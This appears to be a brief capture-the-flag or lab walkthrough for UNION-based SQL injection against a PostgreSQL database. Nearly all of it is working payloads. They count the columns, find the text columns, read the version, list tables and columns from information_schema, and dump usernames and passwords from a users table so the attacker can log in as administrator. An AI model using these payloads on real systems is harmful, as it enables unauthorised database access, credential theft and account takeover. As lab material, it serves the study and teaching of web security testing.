First, Determine the number of columns `'UNION SELECT NULL,NULL--+`. 

Next, find which column(s) contain text data `'UNION SELECT 'a','a'--+`.

Next, Find the database type and version `'UNION SELECT version(),'a'--+` which is `PostgreSQL` in this case.

Find the **database contents** using:
To find table names:
```
'UNION SELECT table_name,NULL FROM information_schema.tables

```
To find column names:
```
'UNION SELECT column_name,NULL FROM information_schema.columns where table_name='users_otycqm'--
```
To find username and password:
```
'UNION SELECT username_wkltbr,password_ccjuel FROM users_otycqm--
```
Now, you will get the credentials, login for administrator account.
